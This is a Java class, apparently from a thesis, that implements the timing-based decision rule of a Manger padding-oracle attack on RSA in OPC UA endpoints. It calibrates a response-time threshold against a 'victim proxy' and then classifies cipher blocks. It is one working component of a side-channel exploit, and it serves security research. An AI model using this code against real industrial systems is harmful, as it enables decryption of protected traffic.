package attacks.manger.oracle.timing;

import attacks.manger.oracle.Oracle;
import attacks.manger.oracle.OracleException;
import attacks.manger.oracle.VictimProxy;
import opcua.context.Endpoint;

import java.math.BigInteger;
import java.security.SecureRandom;

/**
 * Implementation of the linear decision rule described in the thesis.
 */
public class LinearDecisionRule implements DecisionRule {
    private final int rounds;
    private final int sampleSize;
    private VictimProxy victimProxy;
    private DecisionBoundary decisionBoundary;


    /**
     * Used to describe the decision boundary that is inferred in the calibration phase
     */
    public static class DecisionBoundary {
        private final double threshold;
        private final boolean inverted;
        private final double empMeanLessB;
        private final double empMeanGeqB;
        private final double meanEmpStandardDeviation;
        private final int percentileNumerator;

        /**
         * Constructor
         * @param threshold If timing is smaller than threshold, the decision rule yields "<B"
         * @param inverted If true, the rule is inverted
         * @param empMeanLessB Empirical mean of the "<B" sample set
         * @param empMeanGeqB Empirical mean of the ">=B" sample set
         * @param meanEmpStandardDeviation Combined empirical standard deviation
         * @param percentileNumerator Numerator of the chosen percentile
         */
        DecisionBoundary(double threshold, boolean inverted, double empMeanLessB, double empMeanGeqB, double meanEmpStandardDeviation, int percentileNumerator) {
            this.threshold = threshold;
            this.inverted = inverted;
            this.empMeanLessB = empMeanLessB;
            this.empMeanGeqB = empMeanGeqB;
            this.meanEmpStandardDeviation = meanEmpStandardDeviation;
            this.percentileNumerator = percentileNumerator;
        }

        public double getThreshold() {
            return threshold;
        }

        public boolean isInverted() {
            return inverted;
        }

        public double getEmpMeanLessB() {
            return empMeanLessB;
        }

        public double getEmpMeanGeqB() {
            return empMeanGeqB;
        }

        public double getMeanEmpStandardDeviation() {
            return meanEmpStandardDeviation;
        }

        public int getPercentileNumerator() {
            return percentileNumerator;
        }
    }

    /**
     * Constructs uninitialized decision rul
     * @param victimProxy Interface to the endpoint
     * @param rounds Number of rounds
     * @param sampleSize Sample size per round
     */
    public LinearDecisionRule(VictimProxy victimProxy, int rounds, int sampleSize) {
        this.victimProxy = victimProxy;
        this.rounds = rounds;
        this.sampleSize = sampleSize;
    }

    /**
     * Constructs a decision rule from existing boundary
     * @param decisionBoundary The decision boundary
     * @param rounds Number of rounds
     * @param sampleSize Sample size per round
     */
    public LinearDecisionRule(DecisionBoundary decisionBoundary, int rounds, int sampleSize) {
        this.decisionBoundary = decisionBoundary;
        this.rounds = rounds;
        this.sampleSize = sampleSize;
    }

    @Override
    public void learn() throws OracleException {
        if(victimProxy == null) {
            throw new OracleException("Set up victim proxy first");
        }

        int blockSize = victimProxy.getBlockSize();
        Endpoint endpoint = victimProxy.getEndpoint();
        BigInteger B = BigInteger.ONE.shiftLeft((blockSize-1)*8);
        SecureRandom secureRandom = new SecureRandom();

        // Create random plaintext blocks <B
        byte[][] blocksLessB = new byte[rounds][blockSize];
        for (int i=0; i < rounds; i++) {
            secureRandom.nextBytes(blocksLessB[i]);
            blocksLessB[i][0] = (byte)0;
        }

        // Create random plaintext blocks >=B
        byte[][] blocksGeqB = new byte[rounds][blockSize];
        for (int i=0; i < rounds; i++) {
            do {
                secureRandom.nextBytes(blocksGeqB[i]);
            } while (new BigInteger(blocksGeqB[i]).compareTo(endpoint.getPublicKey().getModulus()) > 0
                    && new BigInteger(blocksGeqB[i]).compareTo(B) < 0);
        }

        long[][] timingsLessB = new long[rounds][sampleSize];
        long[][] timingsGeqB = new long[rounds][sampleSize];
        for(int i=0; i<rounds; i++) {
            for(int j=0; j<sampleSize; j++) {
                timingsLessB[i][j] = victimProxy.sendEncryptedPlainBlock(blocksLessB[i]).getResponseTime();
            }
            for(int j=0; j<sampleSize; j++) {
                timingsGeqB[i][j] = victimProxy.sendEncryptedPlainBlock(blocksGeqB[i]).getResponseTime();
            }
            System.out.println(i);
        }

        int percentileNumerator = Filter.findBestPercentile(timingsLessB, timingsGeqB, 0, (int)(sampleSize*0.02));

        double[] filteredTimingsLessB = Filter.ithPercentile(timingsLessB, percentileNumerator);
        double[] filteredTimingsGeqB = Filter.ithPercentile(timingsGeqB, percentileNumerator);
        double empiricalMeanLessB = Filter.empiricalMean(filteredTimingsLessB);
        double empiricalMeanGeqB = Filter.empiricalMean(filteredTimingsGeqB);
        double meanEmpiricalStandardDeviation = Filter.meanEmpiricalStandardDeviation(filteredTimingsLessB, filteredTimingsGeqB);
        double threshold = (empiricalMeanLessB + empiricalMeanGeqB) / 2;

        decisionBoundary = new DecisionBoundary(threshold, empiricalMeanLessB > empiricalMeanGeqB, empiricalMeanLessB, empiricalMeanGeqB, meanEmpiricalStandardDeviation, percentileNumerator);
    }

    @Override
    public boolean predict(byte[] cipherBlock) throws OracleException {
        if(victimProxy == null) {
            throw new OracleException("Set up victim proxy first");
        }

        if(decisionBoundary == null) {
            throw new OracleException("Decision rule not yet learned");
        }

        long[] samples = new long[sampleSize];
        for(int j=0; j<sampleSize; j++) {
            samples[j] = victimProxy.sendCipherBlock(cipherBlock).getResponseTime();
        }

        double filteredValue = Filter.ithPercentile(samples, decisionBoundary.getPercentileNumerator());
        return filteredValue < decisionBoundary.getThreshold() ^ decisionBoundary.isInverted();
    }

    public VictimProxy getVictimProxy() {
        return victimProxy;
    }

    public void setVictimProxy(VictimProxy victimProxy) {
        this.victimProxy = victimProxy;
    }

    public DecisionBoundary getDecisionBoundary() {
        return decisionBoundary;
    }

    public void setDecisionBoundary(DecisionBoundary decisionBoundary) {
        this.decisionBoundary = decisionBoundary;
    }
}
